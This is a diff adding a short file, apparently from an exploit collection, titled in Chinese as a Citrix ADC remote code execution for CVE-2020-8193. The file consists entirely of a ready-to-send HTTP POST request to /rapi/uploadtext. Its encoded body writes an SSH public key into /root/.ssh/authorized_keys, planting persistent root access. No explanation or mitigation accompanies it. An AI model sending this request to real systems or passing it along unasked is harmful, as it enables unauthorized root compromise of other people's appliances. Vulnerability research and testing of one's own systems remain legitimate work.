@@ -1,0 +1,11 @@
+# Citrix ADC远程代码执行(CVE-2020-8193)
+POST /rapi/uploadtext?_ZQA_ID={ZQA_ID} HTTP/1.1
+Host: www.xwd_test.com
+User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.89 Safari/537.36
+Accept-Encoding: gzip, deflate
+Accept: */*
+Connection: keep-alive
+Cookie: Cookie=startupapp=neo; is_cisco_platform=0; st_splitter=350px; SESSID=6c8e255a118516ff2cb50fa2ee6cbda1; rdx_pagination_size=25%20Per%20Page; rand_key=1179557566.1594810901289502
+Content-Type: application/x-www-form-urlencoded
+
+object=%7B%22uploadtext%22%3A+%7B%22filedir%22%3A+%22%2Froot%2F.ssh%2F%22%2C+%22filedata%22%3A+%22ssh-rsa+AAAAB3NzaC1yc2EAAAABIwAAAQEArcYpkcSlOgMWzeihri9aFkQC0ggV8s%2FlhycAo04UuEBhkFVCOk%2Fy3mEXK%2B16LgHaCekrKyXQakKfRo8%2FQdkl87gSFTgU9thA%2BbMAPf6hwCbHQ4t0Hi%2B4d0I%2FrQrI3MTsDNxXGzMfH1w7ZpV6DkYlQ4gcGRGaywyryyuBgypsxsG2ejlZ8Zaa6nv%2BVYhRe5CzzwC8tCkgCJ6fXGfCP8LWxOPTKKg9AwmIEceuJe0PErrZNADCBmqOGsY%2Fjx6hFqeUNN38QllIta7H9dfogcWsYCEm1PxfDrkBu%2FeX8qS9qHc5YU64akN1uojPE4Ar5vsT3A083cyiu7Eo91X7T%2Bs1mw%3D%3D+root%40localhost.localdomain%22%2C+%22filename%22%3A+%22authorized_keys%22%7D%7D
